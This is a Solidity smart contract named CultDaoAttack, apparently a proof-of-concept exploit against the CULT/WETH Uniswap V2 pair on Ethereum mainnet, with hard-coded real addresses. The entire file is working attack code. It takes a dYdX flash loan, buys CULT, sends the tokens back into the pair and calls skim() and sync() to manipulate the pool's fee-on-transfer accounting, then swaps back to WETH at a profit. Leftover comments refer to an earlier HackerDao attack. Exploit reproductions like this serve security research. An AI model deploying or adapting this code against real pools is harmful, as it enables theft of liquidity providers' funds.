//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
pragma abicoder v2;

// import './libraries/Decimal.sol';
// import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import './DydxFlashLoanBase.sol';
import './interfaces/IUniswapV2Pair.sol';
import 'hardhat/console.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';


interface IUniRouter {
    function getAmountsIn(uint amountOut, address[] memory path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract CultDaoAttack is DydxFlashloanBase{
    address public constant SoloMargin_address = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
    address public constant WETH_address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant CULT_address = 0xf0f9D895aCa5c8678f706FB8216fa22957685A13;
    address public constant UniSwapRouter2_address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant CULT_WETH_PAIR_address = 0x5281E311734869C64ca60eF047fd87759397EFe6;

    IERC20 public constant WETH = IERC20(WETH_address);
    IERC20 public constant CultDao = IERC20(CULT_address);
    IUniswapV2Pair public constant CULT_WETH_PAIR = IUniswapV2Pair(CULT_WETH_PAIR_address);
    IUniRouter public constant UniSwapROuter = IUniRouter(UniSwapRouter2_address);
    struct MyCustomData {
        address token;
        uint256 repayAmount;
    }
    function callFunction(
        address sender,
        Account.Info memory account,
        bytes memory data
    ) public {
        MyCustomData memory mcd = abi.decode(data, (MyCustomData));
        uint256 balOfLoanedToken = IERC20(mcd.token).balanceOf(address(this));
        console.log("my weth amt %s", balOfLoanedToken/ 1 ether);
        // require(
        //     balOfLoanedToken >= mcd.repayAmount,
        //     "Not enough funds to repay dydx loan!"
        // );
        CultDao.approve(UniSwapRouter2_address, type(uint256).max); // 
        WETH.approve(UniSwapRouter2_address, type(uint256).max);

        uint256 lp_cult_amt = CultDao.balanceOf(CULT_WETH_PAIR_address);

        address[] memory path = new address[](2);
        path[0] = WETH_address;
        path[1] = CULT_address;
        uint256 percentage = 30; // 90%
        uint256 buy_amt = (lp_cult_amt * percentage) / 1000;
        console.log("Now I wan to swap %s of CULT", buy_amt / 1 ether);
        uint[] memory amounts = UniSwapROuter.getAmountsIn(buy_amt, path); // 计算一下，要掏空池子里面90%的 
        console.log("I Need WETH amt %s", amounts[0]/1 ether);
        uint deadline =  block.timestamp + 6 hours;
        UniSwapROuter.swapExactTokensForTokens(amounts[0], 0, path, address(this), deadline); // 将借来的WBNB 换成HackerDao
        uint256 my_cult_amt = CultDao.balanceOf(address(this));
        console.log("after swap Now my WETH num # %s, CULT num # %s",WETH.balanceOf(address(this))/ 1 ether,my_cult_amt/1 ether);
        
        CultDao.transfer(CULT_WETH_PAIR_address,my_cult_amt);
        CULT_WETH_PAIR.skim(address(this));
        CULT_WETH_PAIR.sync();

        my_cult_amt = CultDao.balanceOf(address(this));
        console.log("after SKIM now I have %s CULT", my_cult_amt/1 ether);

        address[] memory revert_path = new address[](2);
        revert_path[0] = CULT_address;
        revert_path[1] = WETH_address;

        //swapExactTokensForTokensSupportingFeeOnTransferTokens 的用法 https://blog.csdn.net/zgf1991/article/details/109127260/
        console.log("Before swapExactTokensForTokensSupportingFeeOnTransferTokens my WETH amt: %s",WETH.balanceOf(address(this))/ 1 ether);
        UniSwapROuter.swapExactTokensForTokensSupportingFeeOnTransferTokens(CultDao.balanceOf(address(this)), 0, revert_path, address(this), deadline); // 将手上的HackerDao全部换成WBNB
        console.log("After swapExactTokensForTokensSupportingFeeOnTransferTokens my WETH amt: %s",WETH.balanceOf(address(this))/1 ether);

        WETH.transferFrom(address(this), SoloMargin_address, mcd.repayAmount);
    }
     function initiateFlashLoan(address _solo, address _token, uint256 _amount)
        external
    {
        ISoloMargin solo = ISoloMargin(_solo);

        // Get marketId from token address
        uint256 marketId = _getMarketIdFromTokenAddress(_solo, _token);

        // Calculate repay amount (_amount + (2 wei))
        // Approve transfer from
        uint256 repayAmount = _getRepaymentAmountInternal(_amount);
        IERC20(_token).approve(_solo, repayAmount);

        // 1. Withdraw $
        // 2. Call callFunction(...)
        // 3. Deposit back $
        Actions.ActionArgs[] memory operations = new Actions.ActionArgs[](3);

        operations[0] = _getWithdrawAction(marketId, _amount);
        operations[1] = _getCallAction(
            // Encode MyCustomData for callFunction
            abi.encode(MyCustomData({token: _token, repayAmount: repayAmount}))
        );
        operations[2] = _getDepositAction(marketId, repayAmount);

        Account.Info[] memory accountInfos = new Account.Info[](1);
        accountInfos[0] = _getAccountInfo();

        solo.operate(accountInfos, operations);
        uint256 weth_amt = WETH.balanceOf(address(this));
        console.log("After FlashLoan Now I Have %s $s",weth_amt);
    }

}